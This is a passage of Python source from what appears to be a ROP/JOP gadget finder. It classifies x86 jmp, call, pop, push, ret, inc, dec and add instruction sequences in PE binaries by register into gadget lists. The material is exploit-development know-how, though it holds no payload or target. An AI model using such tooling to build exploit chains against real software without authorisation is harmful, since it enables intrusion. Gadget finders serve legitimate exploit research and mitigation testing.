						addGadgetJmp(saveq, pe,n,offL[lGoBack],op_str, raw, n, "jmp", ebp, fg.jmpDwordOffsetEBP,offVal)
			elif "[esp" in testVal:
				if "jmp dword ptr [esp]" in testVal:
					addGadgetJmp(saveq, pe,n,offL[lGoBack],op_str, raw, n, "jmp", esp, fg.jmpDwordESP)
				elif re.match( r'jmp dword ptr \[esp [+|-]+', testVal, re.M|re.I):
					foundOffset,offVal=self.extractOffset(op_strL[lGoBack])
					if foundOffset:
						addGadgetJmp(saveq, pe,n,offL[lGoBack],op_str, raw, n, "jmp", esp, fg.jmpDwordOffsetESP,offVal)
			elif "[edi" in testVal:
				if "jmp dword ptr [edi]" in testVal:
					addGadgetJmp(saveq, pe,n,offL[lGoBack],op_str, raw, n, "jmp", edi, fg.jmpDwordEDI)
				elif re.match( r'jmp dword ptr \[edi [+|-]+', testVal, re.M|re.I):
					foundOffset,offVal=self.extractOffset(op_strL[lGoBack])
					if foundOffset:
						addGadgetJmp(saveq, pe,n,offL[lGoBack],op_str, raw, n, "jmp", edi, fg.jmpDwordOffsetEDI,offVal)
			elif "[esi" in testVal:
				if "jmp dword ptr [esi]" in testVal:
					addGadgetJmp(saveq, pe,n,offL[lGoBack],op_str, raw, n, "jmp", esi, fg.jmpDwordESI)
				elif re.match( r'jmp dword ptr \[esi [+|-]+', testVal, re.M|re.I):
					foundOffset,offVal=self.extractOffset(op_strL[lGoBack])
					if foundOffset:
						addGadgetJmp(saveq, pe,n,offL[lGoBack],op_str, raw, n, "jmp", esi, fg.jmpDwordOffsetESI,offVal)
			elif "[eax" in testVal:
				if "jmp dword ptr [eax]" in testVal:
					addGadgetJmp(saveq, pe,n,offL[lGoBack],op_str, raw, n, "jmp", eax, fg.jmpDwordEAX)
				elif re.match( r'jmp dword ptr \[eax [+|-]+', testVal, re.M|re.I):
					foundOffset,offVal=self.extractOffset(op_strL[lGoBack])
					if foundOffset:
						addGadgetJmp(saveq, pe,n,offL[lGoBack],op_str, raw, n, "jmp", eax, fg.jmpDwordOffsetEAX,offVal)
			elif "[ebx" in testVal:
				if "jmp dword ptr [ebx]" in testVal:
					addGadgetJmp(saveq, pe,n,offL[lGoBack],op_str, raw, n, "jmp", ebx, fg.jmpDwordEBX)
				elif re.match( r'jmp dword ptr \[ebx [+|-]+', testVal, re.M|re.I):
					foundOffset,offVal=self.extractOffset(op_strL[lGoBack])
					if foundOffset:
						addGadgetJmp(saveq, pe,n,offL[lGoBack],op_str, raw, n, "jmp", ebx, fg.jmpDwordOffsetEBX,offVal)
			elif "[ecx" in testVal:
				if "jmp dword ptr [ecx]" in testVal:
					addGadgetJmp(saveq, pe,n,offL[lGoBack],op_str, raw, n, "jmp", ecx, fg.jmpDwordECX)
				elif re.match( r'jmp dword ptr \[ecx [+|-]+', testVal, re.M|re.I):
					foundOffset,offVal=self.extractOffset(op_strL[lGoBack])
					if foundOffset:
						addGadgetJmp(saveq, pe,n,offL[lGoBack],op_str, raw, n, "jmp", ecx, fg.jmpDwordOffsetECX,offVal)
			elif "[edx" in testVal:
				if "jmp dword ptr [edx]" in testVal:
					addGadgetJmp(saveq, pe,n,offL[lGoBack],op_str, raw, n, "jmp", edx, fg.jmpDwordEDX)
				elif re.match( r'jmp dword ptr \[edx [+|-]+', testVal, re.M|re.I):
					foundOffset,offVal=self.extractOffset(op_strL[lGoBack])
					if foundOffset:
						addGadgetJmp(saveq, pe,n,offL[lGoBack],op_str, raw, n, "jmp", edx, fg.jmpDwordOffsetEDX,offVal)

	def go_call(self,testVal,saveq, offL,op_str,lGoBack, n, raw,mnemonicL, op_strL, c2,jmp=False):
		if "dword" not in testVal:

			if re.match( r'\bcall esi\b', testVal, re.M|re.I):
				addGadgetJmp(saveq, pe,n,offL[lGoBack],op_str, raw, n, "call", eax, fg.callESI)
			elif re.match( r'\bcall ebp\b', testVal, re.M|re.I):
				addGadgetJmp(saveq, pe,n,offL[lGoBack],op_str, raw, n, "call", ebp, fg.callEBP)
			elif re.match( r'\bcall edi\b', testVal, re.M|re.I):
				addGadgetJmp(saveq, pe,n,offL[lGoBack],op_str, raw, n, "call", edi, fg.callEDI)
			elif re.match( r'^call eax',testVal, re.M|re.I):
				dp("saving call eax")
				addGadgetJmp(saveq, pe,n,offL[lGoBack],op_str, raw, n, "call", eax, fg.callEAX)
			elif re.match( r'^call ebx', testVal, re.M|re.I):
				addGadgetJmp(saveq, pe,n,offL[lGoBack],op_str, raw, n, "call", ebx, fg.callEBX)
			elif re.match( r'\bcall esp\b',testVal, re.M|re.I):
				addGadgetJmp(saveq, pe,n,offL[lGoBack],op_str, raw, n, "call", esp, fg.callESP)	
			elif re.match( r'\bcall ecx\b', testVal, re.M|re.I):
				addGadgetJmp(saveq, pe,n,offL[lGoBack],op_str, raw, n, "call", ecx, fg.callECX)
			elif re.match( r'\bcall edx\b', testVal, re.M|re.I):
				addGadgetJmp(saveq, pe,n,offL[lGoBack],op_str, raw, n, "call", edx, fg.callEDX)
		else:
			if "[ebp" in testVal:
				if "call dword ptr [ebp]" in testVal:
					addGadgetJmp(saveq, pe,n,offL[lGoBack],op_str, raw, n, "call", ebp, fg.callDwordEBP)
				elif re.match( r'call dword ptr \[ebp [+|-]+', testVal, re.M|re.I):
					foundOffset,offVal=self.extractOffset(op_strL[lGoBack])
					if foundOffset:
						addGadgetJmp(saveq, pe,n,offL[lGoBack],op_str, raw, n, "call", ebp, fg.callDwordOffsetEBP,offVal)
			elif "[esp" in testVal:
				if "call dword ptr [esp]" in testVal:
					addGadgetJmp(saveq, pe,n,offL[lGoBack],op_str, raw, n, "call", esp, fg.callDwordESP)
				elif re.match( r'call dword ptr \[esp [+|-]+', testVal, re.M|re.I):
					foundOffset,offVal=self.extractOffset(op_strL[lGoBack])
					if foundOffset:
						addGadgetJmp(saveq, pe,n,offL[lGoBack],op_str, raw, n, "call", esp, fg.callDwordOffsetESP,offVal)
			elif "[edi" in testVal:
				if "call dword ptr [edi]" in testVal:
					addGadgetJmp(saveq, pe,n,offL[lGoBack],op_str, raw, n, "call", edi, fg.callDwordEDI)
				elif re.match( r'call dword ptr \[edi [+|-]+', testVal, re.M|re.I):
					foundOffset,offVal=self.extractOffset(op_strL[lGoBack])
					if foundOffset:
						addGadgetJmp(saveq, pe,n,offL[lGoBack],op_str, raw, n, "call", edi, fg.callDwordOffsetEDI,offVal)
			elif "[esi" in testVal:
				if "call dword ptr [esi]" in testVal:
					addGadgetJmp(saveq, pe,n,offL[lGoBack],op_str, raw, n, "call", esi, fg.callDwordESI)
				elif re.match( r'call dword ptr \[esi [+|-]+', testVal, re.M|re.I):
					foundOffset,offVal=self.extractOffset(op_strL[lGoBack])
					if foundOffset:
						addGadgetJmp(saveq, pe,n,offL[lGoBack],op_str, raw, n, "call", esi, fg.callDwordOffsetESI,offVal)
			elif "[eax" in testVal:
				if "call dword ptr [eax]" in testVal:
					addGadgetJmp(saveq, pe,n,offL[lGoBack],op_str, raw, n, "call", eax, fg.callDwordEAX)
				elif re.match( r'call dword ptr \[eax [+|-]+', testVal, re.M|re.I):
					foundOffset,offVal=self.extractOffset(op_strL[lGoBack])
					if foundOffset:
						addGadgetJmp(saveq, pe,n,offL[lGoBack],op_str, raw, n, "call", eax, fg.callDwordOffsetEAX,offVal)
			elif "[ebx" in testVal:
				if "call dword ptr [ebx]" in testVal:
					addGadgetJmp(saveq, pe,n,offL[lGoBack],op_str, raw, n, "call", ebx, fg.callDwordEBX)
				elif re.match( r'call dword ptr \[ebx [+|-]+', testVal, re.M|re.I):
					foundOffset,offVal=self.extractOffset(op_strL[lGoBack])
					if foundOffset:
						addGadgetJmp(saveq, pe,n,offL[lGoBack],op_str, raw, n, "call", ebx, fg.callDwordOffsetEBX,offVal)
			elif "[ecx" in testVal:
				if "call dword ptr [ecx]" in testVal:
					addGadgetJmp(saveq, pe,n,offL[lGoBack],op_str, raw, n, "call", ecx, fg.callDwordECX)
				elif re.match( r'call dword ptr \[ecx [+|-]+', testVal, re.M|re.I):
					foundOffset,offVal=self.extractOffset(op_strL[lGoBack])
					if foundOffset:
						addGadgetJmp(saveq, pe,n,offL[lGoBack],op_str, raw, n, "call", ecx, fg.callDwordOffsetECX,offVal)
			elif "[edx" in testVal:
				if "call dword ptr [edx]" in testVal:
					addGadgetJmp(saveq, pe,n,offL[lGoBack],op_str, raw, n, "call", edx, fg.callDwordEDX)
				elif re.match( r'call dword ptr \[edx [+|-]+', testVal, re.M|re.I):
					foundOffset,offVal=self.extractOffset(op_strL[lGoBack])
					if foundOffset:
						addGadgetJmp(saveq, pe,n,offL[lGoBack],op_str, raw, n, "call", edx, fg.callDwordOffsetEDX,offVal)
	def doRetf(self, name: str, testVal,saveq, offL,op_str,lGoBack, n, raw,mnemonicL, op_strL, c2=False):
		do = f"do_hg_{name}"

		check1=raw.hex()+hex(saveq)
		if (check1) not in fg.junkBox:
		# if 1==1:
			if hasattr(self, do) and callable(func := getattr(self, do)):
				obj=func(testVal,saveq, offL,op_str,lGoBack, n, raw,mnemonicL, op_strL, c2)
				dp("do func retf", name, hex(offL[lGoBack]))
				fg.junkBox.add(check1)

	def doRetfSingle(self, name: str, testVal,saveq, offL,op_str,lGoBack, n, raw,mnemonicL, op_strL, c2=False):
		dp("doRetfSingle")
		check1=raw.hex()+hex(saveq)
		do = f"do_retf_s"

		if (check1) not in fg.junkBox:
		# if 1==1:
			if hasattr(self, do) and callable(func := getattr(self, do)):
				dp("do func retf single-pre", name, hex(offL[lGoBack]))

				obj=func(testVal,saveq, offL,op_str,lGoBack, n, raw,mnemonicL, op_strL, c2)
				dp("do func retf single", name, hex(offL[lGoBack]))
				fg.junkBox.add(check1)

	def do_retf_s(self,testVal,saveq, offL,op_str,lGoBack, n, raw,mnemonicL, op_strL, c2=False):
		addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, None, fg.retfSingle)
	def do_pop(self,testVal,saveq, offL,op_str,lGoBack, n, raw,mnemonicL, op_strL, c2=False):
		if "ptr" not in testVal:
			if re.match( r'pop e[abcdspb]{2}', testVal, re.M|re.I):
				addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, None, fg.pops)
			if re.match( r'\bpop esi\b', testVal, re.M|re.I):
				addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, eax, fg.popESI)
			elif re.match( r'^pop [e]*b[x|l|h]+', testVal, re.M|re.I):
				addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, ebx, fg.popEBX)
			elif re.match( r'^pop [e]*c[x|l|h]+', testVal, re.M|re.I):
				addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, ecx, fg.popECX)
			elif re.match( r'^pop [e]*a[x|l|h]+',testVal, re.M|re.I):
				addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, eax, fg.popEAX)
			elif re.match( r'\bpop edi\b', testVal, re.M|re.I):
				addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, edi, fg.popEDI)
			elif re.match( r'\bpop ebp\b', testVal, re.M|re.I):
				addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, ebp, fg.popEBP)
			elif re.match( r'\bpop esp\b',testVal, re.M|re.I):
				addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, esp, fg.popESP)
			elif re.match( r'^pop [e]*d[x|l|h]+', testVal, re.M|re.I):
				addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, edx, fg.popEDX)
			else:
				addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, edx, fg.popOther)
		else:
			addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, None, fg.popDword)
			if re.match( r'^pop dword ptr \[[e]*a[x|l|h]+', testVal, re.M|re.I):
				addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, eax, fg.popDwordEAX)
			elif re.match( r'^pop dword ptr \[[e]*b[x|l|h]+', testVal, re.M|re.I):
				addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, ebx, fg.popDwordEBX)
			elif re.match( r'^pop dword ptr \[[e]*c[x|l|h]+', testVal, re.M|re.I):
				addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, ecx, fg.popDwordECX)
			elif re.match( r'^pop dword ptr \[[e]*d[x|l|h]+', testVal, re.M|re.I):
				addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, edx, fg.popDwordEDX)
			elif re.match( r'^pop dword ptr \[[e]*si', testVal, re.M|re.I):
				addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, esi, fg.popDwordESI)
			elif re.match( r'^pop dword ptr \[[e]*di', testVal, re.M|re.I):
				addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, edi, fg.popDwordEDI)
			elif re.match( r'^pop dword ptr \[[e]*sp', testVal, re.M|re.I):
				addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, esp, fg.popDwordESP)
			elif re.match( r'^pop dword ptr \[[e]*bp', testVal, re.M|re.I):
				addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, ebp, fg.popDwordEBP)
			else:
				addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, ebp, fg.popDwordOther)

	def do_hg_push(self,testVal,saveq, offL,op_str,lGoBack, n, raw,mnemonicL, op_strL, c2=False):
		if "ptr" not in testVal:
			addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, None, fg.hgPush)
			if re.match( r'^Push [e]*a[x|l|h]+',testVal, re.M|re.I):
				addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, eax, fg.hgPushEAX)
			elif re.match( r'^Push [e]*b[x|l|h]+', testVal, re.M|re.I):
				addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, ebx, fg.hgPushEBX)
			elif re.match( r'^Push [e]*c[x|l|h]+', testVal, re.M|re.I):
				addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, ecx, fg.hgPushECX)
			elif re.match( r'\bPush ebp\b', testVal, re.M|re.I):
				addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, ebp, fg.hgPushEBP)
			elif re.match( r'\bPush esp\b',testVal, re.M|re.I):
				addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, esp, fg.hgPushESP)
			elif re.match( r'^Push [e]*d[x|l|h]+', testVal, re.M|re.I):
				addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, edx, fg.hgPushEDX)
			elif re.match( r'\bPush edi\b', testVal, re.M|re.I):
				addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, edi, fg.hgPushEDI)
			elif re.match( r'\bPush esi\b', testVal, re.M|re.I):
				addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, esi, fg.hgPushESI)
			elif re.match( r'\bPush [-0x]*[0-9a-f]+\b', testVal, re.M|re.I):
				addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, esi, fg.hgPushConstant)
			# elif re.match( r'\bPush dword ptr\b', testVal, re.M|re.I):
			# 	addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, esi, fg.hgPushDword)
			else:
				addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, edx, fg.hgPushOther)
		else:
			addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, None, fg.hgPushDword)
			if re.match( r'^Push dword ptr \[[e]*a[x|l|h]+', testVal, re.M|re.I):
				addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, eax, fg.hgPushDwordEAX)
			elif re.match( r'^Push dword ptr \[[e]*b[x|l|h]+', testVal, re.M|re.I):
				addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, ebx, fg.hgPushDwordEBX)
			elif re.match( r'^Push dword ptr \[[e]*c[x|l|h]+', testVal, re.M|re.I):
				addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, ecx, fg.hgPushDwordECX)
			elif re.match( r'^Push dword ptr \[[e]*d[x|l|h]+', testVal, re.M|re.I):
				addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, edx, fg.hgPushDwordEDX)
			elif re.match( r'^Push dword ptr \[[e]*si', testVal, re.M|re.I):
				addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, esi, fg.hgPushDwordESI)
			elif re.match( r'^Push dword ptr \[[e]*di', testVal, re.M|re.I):
				addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, edi, fg.hgPushDwordEDI)
			elif re.match( r'^Push dword ptr \[[e]*sp', testVal, re.M|re.I):
				addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, esp, fg.hgPushDwordESP)
			elif re.match( r'^Push dword ptr \[[e]*bp', testVal, re.M|re.I):
				addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, ebp, fg.hgPushDwordEBP)
			else:
				addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, ebp, fg.hgPushDwordOther)
	def do_ret(self, name: str, testVal,saveq, offL,op_str,lGoBack, n, raw,mnemonicL, op_strL, c2=False):
		# dp ("do_ret")
		check1=raw.hex()+hex(saveq)
		do = f"do_ret_s"
		if (check1) not in fg.junkBox:
		# if 1==1: 
			if hasattr(self, do) and callable(func := getattr(self, do)):
				# dp ("do func ret single-pre", hex(offL[lGoBack]))
				obj=func(testVal,saveq, offL,op_str,lGoBack, n, raw,mnemonicL, op_strL, c2)
				# dp ("do func ret single", hex(offL[lGoBack]))
				fg.junkBox.add(check1)
	def do_retC2(self, name: str, testVal,saveq, offL,op_str,lGoBack, n, raw,mnemonicL, op_strL, c2=False):
		dp("do_retc2")
		check1=raw.hex()+hex(saveq)
		do = f"do_ret_sC2"
		if (check1) not in fg.junkBox:
		# if 1==1: 
			if hasattr(self, do) and callable(func := getattr(self, do)):
				# dp ("do func ret single-pre", hex(offL[lGoBack]))
				obj=func(testVal,saveq, offL,op_str,lGoBack, n, raw,mnemonicL, op_strL, c2)
				# dp ("do func ret single", hex(offL[lGoBack]))
				fg.junkBox.add(check1)

	def do_ret_s(self,testVal,saveq, offL,op_str,lGoBack, n, raw,mnemonicL, op_strL, c2=False):
		dp("do_ret_s")
		addGadgetNoCheck(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, None, fg.ret)
		
		# dp ("done", len(fg.ret))
	def do_ret_sC2(self,testVal,saveq, offL,op_str,lGoBack, n, raw,mnemonicL, op_strL, c2=False):
		dp("do_ret_sC2")
		addGadgetNoCheck(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, None, fg.retC2)
		
		dp("done retc2", len(fg.ret))
	def do_push(self,testVal,saveq, offL,op_str,lGoBack, n, raw,mnemonicL, op_strL, c2=False):	
		if "ptr" not in testVal:
			addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, None, fg.push)
			if re.match( r'^push [e]*a[x|l|h]+',testVal, re.M|re.I):
				addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, eax, fg.pushEAX)
			elif re.match( r'^push [e]*b[x|l|h]+', testVal, re.M|re.I):
				addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, ebx, fg.pushEBX)
			elif re.match( r'^push [e]*c[x|l|h]+', testVal, re.M|re.I):
				addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, ecx, fg.pushECX)
			elif re.match( r'\bpush ebp\b', testVal, re.M|re.I):
				addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, ebp, fg.pushEBP)
			elif re.match( r'\bpush esp\b',testVal, re.M|re.I):
				addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, esp, fg.pushESP)
			elif re.match( r'^push [e]*d[x|l|h]+', testVal, re.M|re.I):
				addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, edx, fg.pushEDX)
			elif re.match( r'\bpush edi\b', testVal, re.M|re.I):
				addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, edi, fg.pushEDI)
			elif re.match( r'\bpush esi\b', testVal, re.M|re.I):
				addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, esi, fg.pushESI)
			elif re.match( r'\bpush [-0x]*[0-9a-f]+\b', testVal, re.M|re.I):
				addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, esi, fg.pushConstant)
			# elif re.match( r'\bpush dword ptr\b', testVal, re.M|re.I):
			# 	addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, esi, fg.pushDword)
			else:
				addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, edx, fg.pushOther)
						# def disMini(CODED2, address, offset):
			# test=disMini(raw, address, offset)
		elif "fs:[e" in testVal or "fs:[0xc0]" in testVal:
			addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, ebp, fg.pushDwordFS)
			if "eax" in testVal:
				addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, ebp, fg.pushDwordFSEAX)
			elif "ebx" in testVal:
				addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, ebp, fg.pushDwordFSEBX)
			elif "ecx" in testVal:
				addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, ebp, fg.pushDwordFSECX)
			elif "edx" in testVal:
				addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, ebp, fg.pushDwordFSEDX)
			elif "edi" in testVal:
				addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, ebp, fg.pushDwordFSEDI)
			elif "esi" in testVal:
				addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, ebp, fg.pushDwordFSESI)
			elif "ebp" in testVal:
				addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, ebp, fg.pushDwordFSEBP)
		else:
			addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, None, fg.pushDword)
			if re.match( r'^push dword ptr \[[e]*a[x|l|h]+', testVal, re.M|re.I):
				addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, eax, fg.pushDwordEAX)
			elif re.match( r'^push dword ptr \[[e]*b[x|l|h]+', testVal, re.M|re.I):
				addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, ebx, fg.pushDwordEBX)
			elif re.match( r'^push dword ptr \[[e]*c[x|l|h]+', testVal, re.M|re.I):
				addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, ecx, fg.pushDwordECX)
			elif re.match( r'^push dword ptr \[[e]*d[x|l|h]+', testVal, re.M|re.I):
				addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, edx, fg.pushDwordEDX)
			elif re.match( r'^push dword ptr \[[e]*si', testVal, re.M|re.I):
				addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, esi, fg.pushDwordESI)
			elif re.match( r'^push dword ptr \[[e]*di', testVal, re.M|re.I):
				addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, edi, fg.pushDwordEDI)
			elif re.match( r'^push dword ptr \[[e]*sp', testVal, re.M|re.I):
				addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, esp, fg.pushDwordESP)
			elif re.match( r'^push dword ptr \[[e]*bp', testVal, re.M|re.I):
				addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, ebp, fg.pushDwordEBP)
			elif "fs:[e" in testVal or "fs:[0xc0]" in testVal:
				addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, ebp, fg.pushDwordFS)
			else:
				addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, ebp, fg.pushDwordOther)

	def do_inc(self,testVal,saveq, offL,op_str,lGoBack, n, raw,mnemonicL, op_strL, c2=False):
		addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, None, fg.inc)
		if re.match( r'\binc esi\b', testVal, re.M|re.I):
			addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, eax, fg.incESI)
		elif re.match( r'\binc ebp\b', testVal, re.M|re.I):
			addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, ebp, fg.incEBP)
		elif re.match( r'\binc edi\b', testVal, re.M|re.I):
			addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, edi, fg.incEDI)
		elif re.match( r'^inc eax',testVal, re.M|re.I):
			addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, eax, fg.incEAX)
		elif re.match( r'^inc ebx', testVal, re.M|re.I):
			addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, ebx, fg.incEBX)
		elif re.match( r'\binc esp\b',testVal, re.M|re.I):
			addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, esp, fg.incESP)	
		elif re.match( r'^inc ecx', testVal, re.M|re.I):
			addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, ecx, fg.incECX)
		elif re.match( r'^inc edx', testVal, re.M|re.I):
			addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, edx, fg.incEDX)

	def do_dec(self,testVal,saveq, offL,op_str,lGoBack, n, raw,mnemonicL, op_strL, c2=False):
		addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, None, fg.dec)
		if re.match( r'\bdec esi\b', testVal, re.M|re.I):
			addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, eax, fg.decESI)
		elif re.match( r'\bdec ebp\b', testVal, re.M|re.I):
			addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, ebp, fg.decEBP)
		elif re.match( r'\bdec edi\b', testVal, re.M|re.I):
			addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, edi, fg.decEDI)
		elif re.match( r'^dec eax',testVal, re.M|re.I):
			addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, eax, fg.decEAX)
		elif re.match( r'^dec ebx', testVal, re.M|re.I):
			addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, ebx, fg.decEBX)
		elif re.match( r'\bdec esp\b',testVal, re.M|re.I):
			addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, esp, fg.decESP)	
		elif re.match( r'^dec ecx', testVal, re.M|re.I):
			addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, ecx, fg.decECX)
		elif re.match( r'^dec edx', testVal, re.M|re.I):
			addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, edx, fg.decEDX)
	
	def do_adc(self,testVal,saveq, offL,op_str,lGoBack, n, raw,mnemonicL, op_strL, c2=False):
		self.do_add(testVal,saveq, offL,op_str,lGoBack, n, raw,mnemonicL,  op_strL, c2)

	def do_add(self,testVal,saveq, offL,op_str,lGoBack, n, raw,mnemonicL, op_strL, c2=False):
		if not re.match( r'^[add|adc]+ dword ptr \[eax\], eax|[add|adc]+ dword ptr \[ebx\], ebx|[add|adc]+ dword ptr \[ecx\], ecx|[add|adc]+ dword ptr \[edx\], edx|[add|adc]+ dword ptr \[esi\], esi|[add|adc]+ dword ptr \[edi\], edi|[add|adc]+ dword ptr \[ebp\], ebp|[add|adc]+ dword ptr \[esp\], esp|[add|adc]+ [byte|word|dword]+ ptr \[eax\], al|[add|adc]+ [byte|word|dword]+ ptr \[ebx\], bl|[add|adc]+ [byte|word|dword]+ ptr \[ecx\], cl|[add|adc]+ [byte|word|dword]+ ptr \[edx\], dl|[add|adc]+  [byte|word|dword]+ ptr \[eax ]+ eax\], al|[add|adc]+  [byte|word|dword]+ ptr \[ebx \+ ebx\], bl|[add|adc]+  [byte|word|dword]+ ptr \[ecx \+ ecx\], cl|[add|adc]+  [byte|word|dword]+ ptr \[edx \+ edx\], dl|[add|adc]+ [byte|word|dword]+ ptr \[e[abcdxsdbpi]+ [\+|\-]+ e[abcdxsdbpi]+\]|[add|adc]+ [byte|word|dword]+ ptr \[e[abcdxsdbpi]+ [\+|\-]+ e[abcdxsdbpi]+ [\+|\-]+ e[abcdxsdbpi]+\]|[add|adc]+ [byte|word|dword]+ ptr \[e[abcdxsdbpi]+ [\+|\-]+ e[abcdxsdbpi]+ [\+|\-]+ 0x', testVal, re.M|re.I):
			addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, None, fg.add)

			if "ptr" not in testVal:
				if re.match( r'^[add|adc]+ [e]*a[x|l|h]+', testVal, re.M|re.I):
					addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, eax, fg.addEAX)
				elif re.match( r'^[add|adc]+ [e]*b[x|l|h]+', testVal, re.M|re.I):
					addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, ebx, fg.addEBX)
				elif re.match( r'^[add|adc]+ [e]*c[x|l|h]+', testVal, re.M|re.I):
					addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, ecx, fg.addECX)
				elif re.match( r'^[add|adc]+ [e]*sp', testVal, re.M|re.I):
					addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, esp, fg.addESP)
					if re.match( r'^[add|adc]+ [e]*sp, [0]*[x]*[1-90a-f]+', testVal, re.M|re.I):
						if not re.match( r'^[add|adc]+ [e]*sp, e', testVal, re.M|re.I):

							# add esp, 4 # ret  # rop_tester_syscall.exe # \x83\xc4\x04\xc3
							# length: 1  @ 0x004059bb, # (0x59bb) add esp, 0x
							addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, esp, fg.addESPVal)
				elif re.match( r'^[add|adc]+ [e]*bp', testVal, re.M|re.I):
